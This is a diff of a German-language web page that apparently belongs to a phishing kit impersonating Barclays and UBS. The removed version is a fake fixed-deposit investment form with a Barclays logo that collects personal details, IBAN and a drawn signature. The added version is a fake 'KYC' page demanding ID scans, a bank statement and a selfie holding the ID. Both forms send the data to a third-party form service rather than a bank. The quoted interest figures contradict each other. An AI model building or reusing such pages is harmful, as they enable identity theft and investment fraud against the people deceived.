@@ -1,416 +1,186 @@
 <!DOCTYPE html>
 <html lang="de">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Anlagevereinbarungsformular - Mehrschritt</title>
-<style>
-  body {
-    background-image: url('https://github.com/anlageprozess/anlageprozess/blob/main/bg.png?raw=true');
-    background-repeat: no-repeat;
-    background-size: cover;
-    background-position: center center;
-    background-attachment: fixed;
-    margin: 0;
-    min-height: 100vh;
-    font-family: "Lloyds Bank Jack", system-ui, sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
-      Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
-    color: rgb(80, 80, 80);
-  }
-  .container {
-    max-width: 700px;
-    margin: 2rem auto;
-    background: #fff;
-    border-radius: 6px;
-    padding: 3rem 2rem;
-    box-shadow: 0 6px 18px rgba(0, 0, 0, 0.12);
-  }
-  h1 {
-    font-weight: 700;
-    font-size: 1.7rem;
-    margin-bottom: 2rem;
-    color: #002f6c;
-    letter-spacing: 0.02em;
-    text-align: center;
-  }
-  form {
-    display: block;
-  }
-  .step {
-    display: none;
-  }
-  .step.active {
-    display: block;
-  }
-  label {
-    display: block;
-    font-weight: 600;
-    font-size: 1rem;
-    margin-bottom: 0.5rem;
-  }
-  input[type="text"],
-  input[type="email"],
-  input[type="tel"],
-  select,
-  #zinssatz {
-    background-color: #fff;
-    border: 1px solid rgb(80, 80, 80);
-    border-radius: 0;
-    padding: 0.7rem 0.9rem;
-    font-size: 1.125rem;
-    width: 100%;
-    box-sizing: border-box;
-    margin-bottom: 1rem;
-  }
-  input[type="text"]:focus,
-  input[type="email"]:focus,
-  input[type="tel"]:focus,
-  select:focus,
-  #zinssatz:focus {
-    border-color: #005ca5;
-    outline: none;
-    box-shadow: 0 0 6px rgba(0, 92, 165, 0.5);
-  }
-  .row {
-    display: flex;
-    gap: 1.5rem;
-    flex-wrap: wrap;
-    margin-bottom: 1rem;
-  }
-  .row > div {
-    flex: 1 1 48%;
-    min-width: 220px;
-  }
-  .checkbox-container {
-    display: flex;
-    align-items: flex-start;
-    gap: 0.75rem;
-    margin-bottom: 1rem;
-  }
-  .checkbox-container input[type="checkbox"],
-  .checkbox-container input[type="radio"] {
-    margin-top: 4px;
-    width: 20px;
-    height: 20px;
-    border-radius: 0;
-    border: 1.5px solid rgb(80, 80, 80);
-    cursor: pointer;
-    background: white;
-  }
-  .checkbox-container input[type="checkbox"]:focus,
-  .checkbox-container input[type="radio"]:focus {
-    outline: none;
-    border-color: #005ca5;
-    box-shadow: 0 0 6px rgba(0, 92, 165, 0.5);
-  }
-  .checkbox-container label {
-    font-weight: 400;
-    font-size: 1rem;
-    color: rgb(80, 80, 80);
-    line-height: 1.4;
-  }
-  .checkbox-container a {
-    color: rgba(0, 92, 165, 0.5);
-    text-decoration: none;
-    font-weight: 600;
-  }
-  .checkbox-container a:hover,
-  .checkbox-container a:focus {
-    text-decoration: underline;
-  }
-  button {
-    background-color: #005ca5;
-    border: none;
-    padding: 1.1rem 1.5rem;
-    border-radius: 4px;
-    font-weight: 700;
-    font-size: 1.25rem;
-    color: white;
-    cursor: pointer;
-    transition: background-color 0.25s ease;
-    letter-spacing: 0.03em;
-    margin-top: 1rem;
-  }
-  button:hover,
-  button:focus {
-    background-color: #003f7f;
-    outline: none;
-  }
-  button[disabled] {
-    background-color: #999;
-    cursor: not-allowed;
-  }
-  #clear-signature {
-    background-color: #ccc;
-    color: #333;
-    padding: 0.5rem 1rem;
-    font-size: 1rem;
-    margin-top: 0.5rem;
-  }
-  #clear-signature:hover,
-  #clear-signature:focus {
-    background-color: #bbb;
-    outline: none;
-  }
-  /* Signature */
-  #signature-pad {
-    border: 1px solid rgb(80, 80, 80);
-    border-radius: 4px;
-    width: 100%;
-    height: 150px;
-    touch-action: none;
-    margin-bottom: 0.5rem;
-  }
-  @media (max-width: 680px) {
-    .row > div {
-      flex: 1 1 100%;
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>KYC Dokumenten-Upload</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f6f6f6;
+      padding: 30px;
+      margin: 0;
+      color: #000;
     }
-  }
-</style>
+    .form-container {
+      background-color: #fff;
+      max-width: 600px;
+      margin: 40px auto;
+      padding: 35px 40px;
+      border-radius: 12px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.08);
+    }
+    h2 {
+      text-align: center;
+      font-size: 24px;
+      margin-bottom: 20px;
+      color: #0074a6;
+      font-weight: 700;
+    }
+    p.description {
+      font-size: 14px;
+      color: #333;
+      text-align: center;
+      margin-bottom: 25px;
+      line-height: 1.5;
+      max-width: 500px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+    label {
+      display: block;
+      margin-top: 20px;
+      margin-bottom: 8px;
+      font-weight: 600;
+      font-size: 14px;
+      color: #004a7c;
+    }
+    select, input[type="file"] {
+      width: 100%;
+      padding: 12px 14px;
+      font-size: 15px;
+      border: 1.8px solid #ccc;
+      border-radius: 7px;
+      transition: border-color 0.3s ease;
+      box-sizing: border-box;
+      cursor: pointer;
+      background-color: #fafafa;
+      color: #333;
+    }
+    select:focus, input[type="file"]:focus {
+      border-color: #0074a6;
+      outline: none;
+      background-color: #fff;
+    }
+    input[type="file"] {
+      padding: 8px 10px;
+    }
+    .info-text {
+      font-size: 12px;
+      color: #555;
+      margin-top: 6px;
+      line-height: 1.4;
+    }
+    button {
+      margin-top: 30px;
+      width: 100%;
+      padding: 15px;
+      background-color: #0074a6;
+      color: white;
+      font-size: 17px;
+      font-weight: 700;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      box-shadow: 0 4px 8px rgba(0, 116, 166, 0.4);
+    }
+    button:hover {
+      background-color: #005f85;
+      box-shadow: 0 6px 12px rgba(0, 95, 133, 0.6);
+    }
+    hr {
+      border: none;
+      height: 2px;
+      background: linear-gradient(90deg, #0074a6, #004a7c);
+      margin: 25px 0;
+      border-radius: 2px;
+    }
+    /* Responsive */
+    @media (max-width: 600px) {
+      .form-container {
+        padding: 25px 20px;
+      }
+      h2 {
+        font-size: 20px;
+      }
+    }
+  </style>
 </head>
 <body>
-  <main class="container" role="main" aria-label="Anlagevereinbarungsformular">
-    <img src="https://github.com/Identifizierungsverfahren/barclays/blob/main/logoo.png?raw=true" alt="Logo" style="display: block; margin: 0 auto 25px; max-height: 120px;">
-    <h1>Anlagevereinbarungsformular</h1>
-    <form id="multiStepForm" action="https://formcarry.com/s/gmyU7uNOToF" method="POST" accept-charset="UTF-8" novalidate>
-      <!-- Step 1 -->
-      <section class="step active" aria-label="Persönliche Daten">
-        <h2>Schritt 1: Persönliche Daten</h2>
 
-        <!-- Personal Info -->
-        <fieldset>
-          <legend>Persönliche Informationen</legend>
-          <div class="row">
-            <div>
-              <label for="vorname">Vorname *</label>
-              <input type="text" id="vorname" name="vorname" required autocomplete="given-name" placeholder="Max" />
-            </div>
-            <div>
-              <label for="nachname">Nachname *</label>
-              <input type="text" id="nachname" name="nachname" required autocomplete="family-name" placeholder="Mustermann" />
-            </div>
-          </div>
-          <div class="row">
-            <div>
-              <label for="telefon">Telefonnummer *</label>
-              <input type="tel" id="telefon" name="telefon" required placeholder="+49 170 1234567" pattern="^\+?\d{7,15}$" />
-            </div>
-            <div>
-              <label for="email">E-Mail Adresse *</label>
-              <input type="email" id="email" name="email" required autocomplete="email" placeholder="max.mustermann@email.de" />
-            </div>
-          </div>
-        </fieldset>
+  <div class="form-container">
+    <h2>KYC-Verfahren erforderlich: <br>Anleitung zur Einreichung Ihrer Dokumente im Identverfahren</h2>
+    <p class="description">Im Rahmen der gesetzlichen Vorschriften zur Verhinderung von Geldwäsche und Terrorismusfinanzierung sind wir verpflichtet, Ihre Identität sowie die Herkunft der eingesetzten Gelder zu prüfen (Know Your Customer – KYC). Bitte reichen Sie die erforderlichen Nachweise ein, um Ihr Anlagekonto freizuschalten.<br><br>
+      Laden Sie gut lesbare Farbkopien Ihres Ausweisdokuments (Vorder- und Rückseite) sowie einen aktuellen Nachweis des auf Sie lautenden Referenzkontos (z. B. Kontoauszug mit Name und IBAN) zur Verifizierung der Kontoinhaberschaft hoch. Diese Unterlagen sind zur Einhaltung der EU-Geldwäscherichtlinie (Richtlinie (EU) 2015/849) und zur Verifizierung der Kontoinhaberschaft erforderlich.
+    </p>
+    <form 
+      action="https://formcarry.com/s/yGnwpgJAaJG" 
+      method="POST" 
+      enctype="multipart/form-data" 
+      data-formcarry-redirect="https://banksysteme.github.io/ubs/thanks.html">
 
-        <!-- Address -->
-        <fieldset>
-          <legend>Adresse</legend>
-          <div class="row">
-            <div>
-              <label for="strasse">Straße *</label>
-              <input type="text" id="strasse" name="strasse" required placeholder="Musterstraße 12" autocomplete="address-line1" />
-            </div>
-            <div>
-              <label for="plz">PLZ *</label>
-              <input type="text" id="plz" name="plz" required placeholder="12345" autocomplete="postal-code" />
-            </div>
-          </div>
-          <div class="row">
-            <div>
-              <label for="ort">Ort *</label>
-              <input type="text" id="ort" name="ort" required placeholder="Musterstadt" autocomplete="address-level2" />
-            </div>
-            <div>
-              <label for="land">Land *</label>
-              <input type="text" id="land" name="land" value="Deutschland" readonly aria-readonly="true" />
-            </div>
-          </div>
-        </fieldset>
+      <input type="hidden" name="_subject" value="Neue KYC-Freischaltung über">
 
-        <button type="button" id="nextBtn1" aria-label="Weiter zu Schritt 2">Weiter →</button>
-      </section>
+      <label for="id_type"><strong>Art des Ausweisdokuments</strong></label>
+      <select name="id_type" id="id_type" required>
+        <option value="">Bitte wählen</option>
+        <option value="Reisepass">Reisepass</option>
+        <option value="Führerschein">Führerschein</option>
+        <option value="Personalausweis">Personalausweis</option>
+      </select>
 
-      <!-- Step 2 -->
-      <section class="step" aria-label="Konditionen Ihrer Festgeldanlage">
-        <h2>Schritt 2: Konditionen Ihrer Festgeldanlage</h2>
+      <label for="id_front">Vorderseite (PDF/Bild)</label>
+      <input type="file" name="id_front" id="id_front" accept=".pdf,image/*" required>
+      <div class="info-text">
+        Laden Sie gut lesbare Farbkopien Ihres Ausweisdokuments hoch – bei einem Personalausweis sowohl Vorder- als auch Rückseite, bei einem Reisepass nur die Seite mit den Ausweisdaten.
+      </div>
 
-        <p><strong>Anlagebetrag:</strong> 50.000 €</p>
-        <p><strong>Laufzeit:</strong> 12 Monate</p>
-        <p><strong>Zinssatz (p.a.):</strong> 4,45 %</p>
-        <p><strong>Zinsertrag pro Jahr:</strong> 50.000 EUR × 4,45 % = 2.225 EUR</p>
-        <p><strong>Monatlicher Zinsertrag: </strong> 2.225 EUR ÷ 12 = 185.40 EUR</p>
-        
-        <p>
-          Am Ende der Laufzeit erhalten Sie neben Ihrem Anlagebetrag von 50.000 EUR insgesamt 2.550 EUR Zinsen, was einem monatlichen Zinsertrag von 212,50 EUR entspricht.<br />
-        </p>
-
-        <!-- Versteckte Inputs, damit die Werte gesendet werden -->
-        <input type="hidden" name="anlagebetrag" value="50000" />
-        <input type="hidden" name="laufzeit" value="12" />
-        <input type="hidden" name="zinssatz" value="4.45" />
-        <input type="hidden" name="zinsertrag" value="2225" />
-
-        <!-- Banking Details -->
-        <fieldset>
-          <legend>Referenzkonto für Auszahlungen *</legend>
-          <label for="iban">IBAN *</label>
-          <input
-  type="text"
-  id="iban"
-  name="iban"
-  required
-  placeholder="DE12500105170648489890"
-  autocomplete="off"
-  aria-describedby="ibanHelp"
-/>
-          <small id="ibanHelp">Bitte gib deine IBAN ohne Leerzeichen ein.</small>
-          <small id="ibanHelp">Bitte geben Sie Ihre IBAN an, auf die wir die Auszahlungen Ihrer Festgeldanlage vornehmen sollen. Die IBAN muss auf Ihren Namen lauten, um die Auszahlung gemäß den gesetzlichen Vorgaben zu ermöglichen.</small>
-        </fieldset>
-
-        <button type="button" id="prevBtn2" aria-label="Zurück zu Schritt 1">← Zurück</button>
-        <button type="button" id="nextBtn2" aria-label="Weiter zu Schritt 3">Weiter →</button>
-      </section>
-
-      <!-- Step 3 -->
-      <section class="step" aria-label="Einwilligung und Unterschrift">
-        <h2>Schritt 3: Einwilligung und Unterschrift</h2>
-
-        <div class="checkbox-container">
-          <input
-            type="checkbox"
-            id="einwilligung1"
-            name="einwilligung1"
-            required
-          />
-          <label for="einwilligung1">
-            Ich stimme zu, dass meine Daten für die Bearbeitung dieses Vertrages verwendet werden.
-          </label>
+      <div id="id_back_group">
+        <label for="id_back">Rückseite (PDF/Bild)</label>
+        <input type="file" name="id_back" id="id_back" accept=".pdf,image/*" required>
+        <div class="info-text">
+          Bitte laden Sie eine gut lesbare Farbkopie der Rückseite Ihres Ausweisdokuments hoch.
         </div>
+      </div>
 
-        <div class="checkbox-container">
-          <input
-            type="checkbox"
-            id="einwilligung2"
-            name="einwilligung2"
-            required
-          />
-          <label for="einwilligung2">
-            Hiermit bestätige ich mein Einverständnis mit den Festgeld-Konditionen und autorisiere die Eröffnung eines Anlagekontos bei der Barclays Bank PLC.
-          </label>
-        </div>
+      <label for="proof_of_address"><strong>Referenzkonto-Verifizierung gemäß GwG – Kontoinhaberschaft erforderlich</strong></label>
+      <input type="file" name="proof_of_address" id="proof_of_address" accept=".pdf,image/*" required>
+      <div class="info-text">
+        Im Rahmen der gesetzlichen Vorgaben zur Verhinderung von Geldwäsche und Terrorismusfinanzierung (Geldwäschegesetz – GwG sowie EU-Richtlinie (EU) 2015/849) sind wir verpflichtet, das von Ihnen angegebene Referenzkonto sowie die Herkunft der zur Investition verwendeten Gelder zu dokumentieren.
 
-        <fieldset>
-          <legend>Unterschrift *</legend>
-          <canvas id="signature-pad" aria-label="Unterschriftenfeld" width="600" height="150"></canvas>
-          <button type="button" id="clear-signature" aria-label="Unterschrift löschen">Unterschrift löschen</button>
-          <input type="hidden" id="signature" name="signature" required />
-        </fieldset>
+Bitte laden Sie hierzu einen aktuellen Kontoauszug (nicht älter als 3 Monate) des Bankkontos hoch, das Sie als Referenzkonto für Ein- und Auszahlungen im Rahmen Ihrer Anlage verwenden möchten. Diesen Kontoauszug erhalten Sie bei Ihrer Hausbank oder können ihn meist auch bequem online über Ihr Online-Banking abrufen.
+      </div>
 
-        <button type="button" id="prevBtn3" aria-label="Zurück zu Schritt 2">← Zurück</button>
-        <button type="submit" id="submitBtn" aria-label="Formular absenden">Absenden</button>
-      </section>
+      <label for="selfie"><strong>Selfie mit Ausweis</strong></label>
+      <input type="file" name="selfie" id="selfie" accept="image/*" required>
+      <div class="info-text">
+        Bitte laden Sie ein Selfie hoch, auf dem Sie Ihren Ausweis gut sichtbar in der Hand halten.
+      </div>
+
+      <button type="submit">Absenden</button>
     </form>
-  </main>
+  </div>
 
   <script>
-    // Mehrschritt Navigation
-    const steps = document.querySelectorAll('.step');
-    let currentStep = 0;
+    const idTypeSelect = document.getElementById('id_type');
+    const idBackGroup = document.getElementById('id_back_group');
+    const idBackInput = document.getElementById('id_back');
 
-    const showStep = (index) => {
-      steps.forEach((step, i) => {
-        step.classList.toggle('active', i === index);
-      });
-    };
-
-    document.getElementById('nextBtn1').addEventListener('click', () => {
-      if (validateStep(steps[0])) {
-        currentStep = 1;
-        showStep(currentStep);
+    function updateUploadFields() {
+      const selected = idTypeSelect.value;
+      if (selected === 'Reisepass') {
+        idBackGroup.style.display = 'none';
+        idBackInput.required = false;
+      } else {
+        idBackGroup.style.display = 'block';
+        idBackInput.required = true;
       }
-    });
-
-    document.getElementById('prevBtn2').addEventListener('click', () => {
-      currentStep = 0;
-      showStep(currentStep);
-    });
-
-    document.getElementById('nextBtn2').addEventListener('click', () => {
-      if (validateStep(steps[1])) {
-        currentStep = 2;
-        showStep(currentStep);
-      }
-    });
-
-    document.getElementById('prevBtn3').addEventListener('click', () => {
-      currentStep = 1;
-      showStep(currentStep);
-    });
-
-    // Formularvalidierung für jeden Schritt
-    function validateStep(step) {
-      const inputs = step.querySelectorAll('input, select, textarea');
-      for (const input of inputs) {
-        if (!input.checkValidity()) {
-          input.reportValidity();
-          return false;
-        }
-      }
-      return true;
     }
 
-    // Signature Pad
-    const canvas = document.getElementById('signature-pad');
-    const signatureInput = document.getElementById('signature');
-    const clearBtn = document.getElementById('clear-signature');
-    const ctx = canvas.getContext('2d');
-
-    let drawing = false;
-
-    canvas.addEventListener('pointerdown', (e) => {
-      drawing = true;
-      ctx.beginPath();
-      ctx.moveTo(e.offsetX, e.offsetY);
-    });
-
-    canvas.addEventListener('pointermove', (e) => {
-      if (!drawing) return;
-      ctx.lineTo(e.offsetX, e.offsetY);
-      ctx.strokeStyle = '#000';
-      ctx.lineWidth = 2;
-      ctx.lineCap = 'round';
-      ctx.stroke();
-    });
-
-    canvas.addEventListener('pointerup', () => {
-      drawing = false;
-      updateSignatureInput();
-    });
-
-    canvas.addEventListener('pointerleave', () => {
-      if (drawing) {
-        drawing = false;
-        updateSignatureInput();
-      }
-    });
-
-    clearBtn.addEventListener('click', () => {
-      ctx.clearRect(0, 0, canvas.width, canvas.height);
-      signatureInput.value = '';
-    });
-
-    function updateSignatureInput() {
-      signatureInput.value = canvas.toDataURL();
-    }
-
-    // Abschicken verhindern, wenn keine Unterschrift
-    document.getElementById('multiStepForm').addEventListener('submit', (e) => {
-      if (!signatureInput.value) {
-        e.preventDefault();
-        alert('Bitte unterschreiben Sie im Unterschriftenfeld.');
-        return false;
-      }
-    });
+    updateUploadFields();
+    idTypeSelect.addEventListener('change', updateUploadFields);
   </script>
+
 </body>
 </html>
